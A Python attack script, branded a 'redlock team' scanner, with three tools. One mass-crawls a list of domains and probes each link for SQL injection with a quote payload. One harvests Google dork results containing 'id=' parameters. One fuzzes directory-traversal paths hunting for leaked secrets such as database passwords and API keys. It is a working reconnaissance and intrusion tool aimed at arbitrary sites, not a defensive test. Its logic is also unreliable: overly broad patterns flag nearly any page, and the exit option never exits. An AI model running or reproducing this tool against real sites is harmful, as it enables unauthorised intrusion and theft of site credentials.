from selenium import webdriver
from selenium.webdriver.common.by import By  
import os
import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import re
from colorama import Fore
import logging


# Main loop to present the user with options for different functionalities
while True:
    print(Fore.CYAN + "1. vuln checker")
    print(Fore.GREEN + "2. dork parser")
    print(Fore.BLUE + "3. site fuzzer")
    choice = input(Fore.LIGHTYELLOW_EX + "input your choice:  ")
    if choice == "1":
        
        # Set up logging to capture output in both console and file
        logging.basicConfig(level=logging.DEBUG)
        console_handler = logging.StreamHandler()
        file_handler = logging.FileHandler("output.log")

        # Customize colorama logging for the console
        console_handler.setFormatter(logging.Formatter('%(message)s'))
        file_handler.setFormatter(logging.Formatter('%(message)s'))

        logger = logging.getLogger()
        logger.addHandler(console_handler)
        logger.addHandler(file_handler)

        # Introduction message for the SQL scanner
        input(Fore.RED + "redlock " + Fore.BLUE + "team " + Fore.MAGENTA + "sql scanner " + Fore.YELLOW + "v1.0 " + Fore.GREEN + "- Press Enter to continue...")
        # Present options for scanning
        print("1. single url to scan: ")
        print("2. list of urls to scan: ")
        print("3. exit: ")

        choice = input(Fore.GREEN + "Enter your choice (1-3): ")

            

            
                
        # Function to provide detailed information for each SQL injection type
        def get_vuln_details(pattern):
            vuln_info = {
                # MySQL
                "SQL syntax.*MySQL": {
                    "description": "MySQL SQL Injection - Attackers exploit flaws in SQL queries to inject malicious code into MySQL databases.",
                    "threat_level": "High"
                },
                "Warning.*mysql_.*": {
                    "description": "MySQL Error-Based SQL Injection - Involves extracting data from MySQL databases by triggering error messages.",
                    "threat_level": "High"
                },
                "valid MySQL result": {
                    "description": "MySQL SQL Injection - Allows attackers to manipulate queries to return results from the database.",
                    "threat_level": "High"
                },
                # PostgreSQL
                "PostgreSQL.*ERROR": {
                    "description": "PostgreSQL SQL Injection - Attackers can inject malicious SQL to exploit PostgreSQL databases.",
                    "threat_level": "High"
                },
                "Warning.*pg_.*": {
                    "description": "PostgreSQL Error-Based SQL Injection - Allows attackers to extract data by causing SQL errors.",
                    "threat_level": "High"
                },
                "valid PostgreSQL result": {
                    "description": "PostgreSQL SQL Injection - Malicious input in queries can retrieve sensitive information from PostgreSQL databases.",
                    "threat_level": "High"
                },
                # MS SQL Server
                "Driver.*SQL[-_ ]*Server": {
                    "description": "SQL Server Injection - Attackers exploit vulnerabilities in SQL Server databases to inject malicious SQL.",
                    "threat_level": "High"
                },
                "OLE DB.*SQL Server": {
                    "description": "SQL Server OLE DB Injection - Attackers can exploit this to inject SQL code into SQL Server via OLE DB.",
                    "threat_level": "High"
                },
                "SQLServer JDBC Driver": {
                    "description": "SQL Server JDBC Injection - Attackers manipulate SQL queries sent through JDBC to SQL Server databases.",
                    "threat_level": "High"
                },
                # Oracle
                "Oracle error": {
                    "description": "Oracle SQL Injection - Attackers exploit SQL injection flaws in Oracle databases to manipulate or retrieve data.",
                    "threat_level": "High"
                },
                "Warning.*oci_.*": {
                    "description": "Oracle OCI SQL Injection - Malicious users can exploit Oracle OCI (Oracle Call Interface) to execute arbitrary SQL commands.",
                    "threat_level": "High"
                },
                "Warning.*ora_.*": {
                    "description": "Oracle SQL Injection - Exploits flaws in Oracle databases by causing SQL errors to leak information.",
                    "threat_level": "High"
                },
                # Generic SQL Injection
                "syntax;": {
                    "description": "Generic SQL Syntax Injection - Often indicates a flaw in input handling, allowing attackers to inject SQL statements.",
                    "threat_level": "Medium"
                },
                "syntax*": {
                    "description": "Generic SQL Syntax Injection - Malicious users exploit syntax errors in SQL queries.",
                    "threat_level": "Medium"
                },
                # Blind SQL Injection (often causes no errors)
                "ERROR.*unclosed.*quote": {
                    "description": "Blind SQL Injection - Suggests that the application might be vulnerable to blind SQL injection.",
                    "threat_level": "High"
                },
                "sql_error": {
                    "description": "Blind SQL Injection - No errors displayed, but the response structure suggests vulnerability.",
                    "threat_level": "High"
                },
                # Time-based SQL Injection (Tautology/Delays)
                "delay.*second": {
                    "description": "Time-based SQL Injection - Attackers can manipulate queries to induce time delays, helping to infer database information.",
                    "threat_level": "High"
                },
                "sleep.*1000": {
                    "description": "Time-based SQL Injection - Potential time-based blind SQL injection if a delay response is triggered.",
                    "threat_level": "High"
                },
                "benchmark.*sleep": {
                    "description": "Benchmark SQL Injection - Uses benchmark function to induce delays to extract information about the database.",
                    "threat_level": "High"
                },
                # More generic patterns for SQLi
                "union.*select.*from": {
                    "description": "Union-Based SQL Injection - An attacker may use the `UNION` SQL operator to fetch data from multiple tables.",
                    "threat_level": "High"
                },
                "select.*from.*where": {
                    "description": "Basic SQL Injection - SQL injection in queries, often used to retrieve sensitive information.",
                    "threat_level": "High"
                },
                # Other database-specific patterns
                "MariaDB.*error": {
                    "description": "MariaDB SQL Injection - Exploits vulnerabilities in MariaDB database to execute malicious queries.",
                    "threat_level": "High"
                },
                "SQLite.*error": {
                    "description": "SQLite SQL Injection - Vulnerability in SQLite-based applications, often caused by incorrect query sanitization.",
                    "threat_level": "High"
                },
                # Advanced SQL Injection
                "select.*from.*information_schema.columns": {
                    "description": "Information Schema SQL Injection - Attacker uses information schema queries to retrieve metadata about the database.",
                    "threat_level": "High"
                },
                "select.*group_concat.*from": {
                    "description": "Advanced SQL Injection - Uses `GROUP_CONCAT` to retrieve multiple rows from the database in a single response.",
                    "threat_level": "High"
                },
                "database.*user": {
                    "description": "Database User SQL Injection - Attackers try to extract sensitive data like database usernames and other internal information.",
                    "threat_level": "High"
                },
                "column.*name.*value": {
                    "description": "Column Injection - Attackers attempt to extract column names and values directly from database tables.",
                    "threat_level": "High"
                },
                "having.*1=1": {
                    "description": "SQL Injection with HAVING clause - Common attack to bypass security by using the `HAVING` clause to create conditions that always evaluate to true.",
                    "threat_level": "High"
                },
                "select.*user()": {
                    "description": "User-based SQL Injection - Exploit that returns the current database user.",
                    "threat_level": "High"
                },
                "select.*version()": {
                    "description": "Database Version Disclosure - Attempts to retrieve the database version, helping attackers tailor their exploits.",
                    "threat_level": "High"
                },
                # NoSQL Injection Patterns (e.g., MongoDB)
                "db.getCollection": {
                    "description": "MongoDB NoSQL Injection - Exploits NoSQL databases like MongoDB to run arbitrary queries.",
                    "threat_level": "High"
                },
                "db.users.find": {
                    "description": "MongoDB NoSQL Injection - Retrieves sensitive data by accessing the `users` collection in MongoDB.",
                    "threat_level": "High"
                },
                # HTTP-based SQL Injection (URL manipulation)
                "union.*select.*from.*information_schema.tables": {
                    "description": "URL-based SQL Injection - The attacker uses a `UNION` query to inject SQL commands through the URL.",
                    "threat_level": "High"
                },
                "select.*user.*password": {
                    "description": "Password Disclosure - SQL injection is used to extract database usernames and passwords.",
                    "threat_level": "High"
                },
                # Cross-Site Scripting (XSS) in SQLi Context
                "document.cookie": {
                    "description": "Cross-Site Scripting (XSS) Combined with SQL Injection - This type of attack may inject SQL along with XSS payloads.",
                    "threat_level": "High"
                },
                "eval": {
                    "description": "Potential Eval Injection - Attempts to execute dynamic JavaScript code within the SQL injection payload.",
                    "threat_level": "Medium"
                },
                # Potential Cross-Site Request Forgery (CSRF) in SQLi context
                "X-CSRF-Token": {
                    "description": "Cross-Site Request Forgery (CSRF) SQL Injection - Attempts to exploit CSRF vulnerabilities combined with SQL injection.",
                    "threat_level": "Medium"
                },
            }

            # Iterate through patterns and check if any match the given string
            for pattern_key in vuln_info:
                if re.search(pattern_key, pattern, re.IGNORECASE):
                    return vuln_info[pattern_key]

            return None



        # Retry configuration
        def get_session():
            session = requests.Session()
            retry = Retry(
                total=3,  # Number of retries
                backoff_factor=1,  # Delay between retries
                status_forcelist=[500, 502, 503, 504]
            )
            adapter = HTTPAdapter(max_retries=retry)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            return session

        # Function to check for SQL Injection vulnerabilities
        def vuln(absolute_url):
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
            session = get_session()  # Using session with retries
            
            payload = absolute_url + "'123"
            
            try:
                response = session.get(payload, headers=headers, timeout=5)  # Decrease timeout for faster checks
                soup = BeautifulSoup(response.text, 'html.parser')

                error_patterns = [
                    "SQL syntax.*MySQL", "Warning.*mysql_.*", "valid MySQL result",
                    "PostgreSQL.*ERROR", "Warning.*pg_.*", "valid PostgreSQL result",
                    "Driver.*SQL[-_ ]*Server", "OLE DB.*SQL Server", "SQLServer JDBC Driver",
                    "Oracle error", "Warning.*oci_.*", "Warning.*ora_.*",
                    "syntax;", "syntax*",
                    "ERROR.*unclosed.*quote", "sql_error",
                    "delay.*second", "sleep.*1000", "benchmark.*sleep",
                    "union.*select.*from", "select.*from.*where",
                    "MariaDB.*error", "SQLite.*error",
                    "select.*from.*information_schema.columns", 
                    "select.*group_concat.*from", "database.*user", 
                    "column.*name.*value", "having.*1=1", 
                    "select.*user()", "select.*version()",
                    "db.getCollection", "db.users.find",  # NoSQL injection patterns
                    "union.*select.*from.*information_schema.tables", 
                    "select.*user.*password", "document.cookie",  # XSS/SQLi combo
                    "eval", "X-CSRF-Token"  # CSRF + SQLi
                ]

                for pattern in error_patterns:
                    if re.search(pattern, str(soup), re.IGNORECASE):
                        vuln_details = get_vuln_details(str(soup))
                        
                        # Log detailed information about the vulnerability
                        logger.info(Fore.GREEN + f"Vulnerable link found: " + Fore.YELLOW + f"{absolute_url}")
                        logger.info(Fore.CYAN + f"\nVulnerability Type: " + Fore.MAGENTA + f"{vuln_details['description']}")
                        logger.info(Fore.YELLOW + f"Threat Level: " + Fore.RED + f"{vuln_details['threat_level']}")
                        directory = "sqli_scanner"
                        filename = os.path.join(directory, "vulnerabilities.txt")
                        os.makedirs(directory, exist_ok=True)
                        # Save to file without colors (plain text)
                        with open(filename, 'a') as f:
                            f.write(f"[VULNERABLE] " + f"{absolute_url}\n")
                            f.write(f"  Vulnerability Type: {vuln_details['description']}\n")
                            f.write(f"  Threat Level: {vuln_details['threat_level']}\n")
                        
                        logger.info(Fore.GREEN + f"\n{'-'*20} Vulnerability written to vulnerabilities.txt {'-'*20}\n")
                        return True
                logger.info(Fore.RED + f"\n{'-'*20} Not vulnerable link: " + Fore.YELLOW + f"{absolute_url} {'-'*20}")
                return False
            except requests.exceptions.RequestException as e:
                logger.info(Fore.YELLOW + f"Request error for " + Fore.RED + f"{absolute_url}: {e}")
                return False
            except Exception as e:
                logger.info(Fore.RED + f"Unexpected error with " + Fore.YELLOW + f"{absolute_url}: {e}")
                return False

        # Function to check if the domain is alive
        def is_domain_alive(url):
            try:
                response = requests.head(url, timeout=5)
                if response.status_code == 200:
                    return True
                else:
                    logger.info(Fore.RED + f"Dead link/domain: {url} (Status: {response.status_code})")
                    return False
            except requests.exceptions.RequestException as e:
                logger.info(Fore.RED + f"Error accessing {url}: {e}")
                return False

        # Function to crawl a single domain
        def crawl_site(url, max_depth=3, max_urls=50):
            visited = set()
            to_visit = [(url, 0)]  
            urls_checked = 0

            # Set up a thread pool for faster URL crawling
            with ThreadPoolExecutor(max_workers=5) as executor:  # Use thread pool for faster checks within a domain
                futures = []
                
                # Use tqdm to create a progress bar for the current domain
                with tqdm(total=max_urls, desc=f"Crawling {url}") as pbar:
                    while to_visit and urls_checked < max_urls:
                        current_url, depth = to_visit.pop(0)
                        if current_url in visited:
                            continue

                        visited.add(current_url)
                        urls_checked += 1
                        pbar.update(1)  # Update the progress bar for each URL checked

                        logger.info(Fore.GREEN + f"\n{'='*20}\nChecking URL " + Fore.YELLOW + f"{urls_checked}/{max_urls}: {current_url}\n{'='*20}")

                        try:
                            # Skip dead links by checking if the domain is reachable first
                            if not is_domain_alive(current_url):
                                continue
                            
                            response = requests.get(current_url, timeout=5)  # Decrease timeout for faster checks
                            response.raise_for_status()

                            if vuln(current_url):
                                logger.info(Fore.CYAN + f"\nVulnerability found in " + Fore.YELLOW + f"{current_url}. " + Fore.CYAN + "Moving to next domain.\n{'-'*20}")
                                return True  # Stop crawling after finding vulnerability

                            if depth < max_depth:
                                soup = BeautifulSoup(response.text, 'html.parser')
                                links = soup.find_all('a')

                                for link in links:
                                    href = link.get('href')
                                    if href:
                                        absolute_url = urljoin(current_url, href)
                                        if absolute_url not in visited and absolute_url.startswith(url):
                                            futures.append(executor.submit(vuln, absolute_url))  # Concurrently check the URL

                            time.sleep(0.5)  # Reduced sleep for faster crawling

                        except requests.exceptions.RequestException as e:
                            logger.info(Fore.YELLOW + f"Error accessing " + Fore.RED + f"{current_url}: {e}")
                            continue

                    # Wait for all futures to complete
                    for future in as_completed(futures):
                        future.result()  # Just to handle potential exceptions in the future

            return False

# Function to crawl multiple domains from a file
        if choice == "2":
            def crawl_domains_from_file():
                file_path = input(Fore.GREEN + "Please provide the path to the file containing domain list: ")  

                try:
                    with open(file_path, 'r') as file:
                        domains = [line.strip() for line in file]

                    for domain in domains:
                        if domain:
                            logger.info(Fore.MAGENTA + f"\n{'='*20}\nCrawling domain: {domain}\n{'='*20}")
                            if crawl_site(f"https://{domain}"):
                                logger.info(Fore.GREEN + f"Vulnerabilities found. Moving to next domain.\n{'-'*20}")
                            else:
                                logger.info(Fore.RED + f"Finished crawling {domain} without finding vulnerabilities.\n{'-'*20}")

                except FileNotFoundError:
                    logger.error(Fore.RED + f"Error: The file {file_path} was not found!")
                except Exception as e:
                    logger.error(Fore.RED + f"Unexpected error: {e}")

            # Start the crawling process
            crawl_domains_from_file()
        elif choice == "1":
            url = input(Fore.GREEN + "Please provide the URL to be checked for vulnerabilities: ")
            if crawl_site(url): # why
                logger.info(Fore.GREEN + f"\nVulnerabilities found. Exiting the program.\n{'-'*20}")
    elif choice == "2":
        query = input("Enter your search query: ")
        
        pages = int(input("Enter the number of pages to scrape: "))
        driver = webdriver.Chrome()

        save = "scraper/links.txt"


        gog = driver.get("https://www.google.com")
        time.sleep(5)
        accept = driver.find_element(By.XPATH, "//*[@role='none'][contains(., 'Accept all') or contains(., 'I agree')]")

        def search_query(query):
            try:
                accept.click()
                search_query_box = driver.find_element(By.NAME, "q")
                search_query_box.send_keys(query)
                search_query_box.submit()
                time.sleep(15) #to allow the user time to accept captcha because selenium fucking sucks
            except Exception as e:
                print(f"An error occurred: {e}")

            

        def scrape_results():
            os.makedirs("scraper", exist_ok=True)
            with open(save, "a") as file:
                for page in range(pages):
                    soup = BeautifulSoup(driver.page_source, "html.parser")
                    results = soup.find_all("a", href=True)
                    for result in results:
                        href = result.get("href", "")
                        if "id=" in href:
                            print(href)
                            file.write(href + "\n")
                            file.flush()  # Ensure the link is written immediately
                    if page == pages - 1:
                        break
                    try:
                        nextbutton = driver.find_element(By.ID, "pnnext")
                        nextbutton.click()
                        time.sleep(5)
                    except Exception as e:
                        print("number of pages scraped:", page + 1)
                        break
            print(f"Links saved to {save}")

        search_query(query)
        scrape_results()

        driver.quit()
    elif choice == "3":
        os.makedirs("fuzzer", exist_ok=True) #makes the dir
        fuzzed_file = "fuzzer/fuzz.txt"
        input_file = "fuzzer/travs.txt" #can add as many site traversals as you want in this
        if not os.path.exists(input_file):
            #instructions for making input file because im too lazy to add automatic traversal file maker atm
            print("you have no input file please make a file in fuzzer called travs.txt and put your directory traversals in there. (one per line)")
        
        sensitive_terms = [
            "DB_PASSWORD", "DATABASE_URL", "API_KEY", "SECRET_KEY", "ACCESS_TOKEN",
            "ADMIN_PASSWORD", "CONFIG_FILE", "CONNECTION_STRING", "PRIVATE_KEY", #known sensitive terms in sites
            "CREDENTIALS", "MYSQL_ROOT_PASSWORD", "WORDPRESS_DB_PASSWORD",
            "DEBUG_MODE", "PRODUCTION_MODE", "ERROR_LOG"
        ]

        inp = input("the site you would like to test: ") 

        def loop():
            with open(input_file, "r") as file, open(fuzzed_file, "a") as fuzzed:
                for line in file:
                    url = f"{inp}{line.strip()}"
                    try:
                        res = requests.get(url)
                        soup = BeautifulSoup(res.content, "html.parser")
                        page_text = soup.get_text()  # Extract text from the page
                        found_terms = [term for term in sensitive_terms if term in page_text]  # Find sensitive terms in the page text
                        if found_terms:  # Found
                            print(Fore.GREEN + f"Tested {url}: Found terms: {', '.join(found_terms)} (Status: {res.status_code})")
                            fuzzed.write(f"{url}: {', '.join(found_terms)}\n")
                        else:
                            print(Fore.RED + f"Tested {url}: Not Found")
                    except Exception as e:  # Error occurred while testing the URL
                        print(Fore.YELLOW + f"Error testing {url}: {e}")
        loop()
    elif choice == "exit":
        print(Fore.YELLOW + "Exiting...")
    else:
        print(Fore.RED + "Invalid choice. Please try again.")

